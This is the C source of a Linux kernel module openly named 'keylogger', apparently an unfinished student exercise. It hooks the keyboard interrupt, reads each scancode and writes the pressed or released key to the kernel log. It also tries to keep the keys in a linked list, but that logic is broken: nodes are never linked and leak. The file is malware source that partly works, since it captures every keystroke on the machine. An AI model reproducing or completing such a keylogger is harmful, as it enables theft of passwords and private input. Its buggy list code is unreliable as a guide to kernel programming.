#include "./keyboard.h"

#define PATH "keylog"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stmartin");
MODULE_DESCRIPTION("Module keylog");

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);

t_keylst	*k_lst = NULL;

static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	printk(KERN_INFO "in key_write\n");
	return 1;
}

static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	printk(KERN_INFO "keylogger: in read\n");
	return 0;
}

static struct file_operations	key_ops = {

	.owner = THIS_MODULE,
	.write = key_write,
	.read = key_read
};

static struct miscdevice	key_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "keylogger",
        .fops = &key_ops
};

t_keylst		*find_last_list_element(t_keylst *full_lst)
{
	t_keylst	*tmp_lst;
	int	i = 0;
	tmp_lst = full_lst;
	while (tmp_lst != NULL)
	{
		printk(KERN_INFO "i -> [%d]", i);
		tmp_lst = tmp_lst->next;
		i++;
	}
	return tmp_lst;
}

t_keylst		*init_node(t_keylst *node)
{
	node->key = 'q';
	node->state = 'a';
	node->value = 1;
	node->name[0] = "h";
//	node->time = NULL;
	node->next = NULL;
	return node;
}

int			add_to_list(unsigned char scancode)
{
	t_keylst	*tmp_lst = NULL;
	t_keylst	*new_node = NULL;

	if (!(new_node = (t_keylst *)kmalloc(sizeof(t_keylst), GFP_KERNEL)))
		return 1;
	new_node = init_node(new_node);
	if (k_lst == NULL)
	{
		printk(KERN_INFO "list est NULL\n");
		printk(KERN_INFO "premier malloc a marcheeeeeeeeeeee\n");
		k_lst = new_node;
		//k_lst->next = NULL;
	}
	else
	{
		printk(KERN_INFO "dans le else du  malloc qui a marcheeeeeeeeeeee\n");
		tmp_lst = k_lst;
		tmp_lst = find_last_list_element(tmp_lst);
		tmp_lst = new_node;
		//tmp_lst->next = NULL;
	}
	printk(KERN_INFO "[%d]\n", scancode & KBD_STATUS_MASK);
	return 0;
}

static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
{
	unsigned char /*status, */scancode;

	scancode = inb(KEYBOARD_DATA);
	printk(KERN_INFO "Scan Code %c %s\n",
            keyboard_map[scancode & KBD_SCANCODE_MASK],
            scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
	if (add_to_list(scancode))
	{
		printk(KERN_INFO "kmalloc failed\n");
		return 1;
	}
	return IRQ_HANDLED;
}

static int		__init keylogger_init(void)
{
	printk(KERN_INFO "in keylogger init function \n");
	if (misc_register(&key_dev))
		return 1;
	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
	{
		printk(KERN_INFO "something went wrong in request_irq\n");
		return -EIO;
	}
	return 0;
}

static void		__exit keylogger_exit(void)
{
	printk(KERN_INFO "exit keylogger\n");
	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
	misc_deregister(&key_dev);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
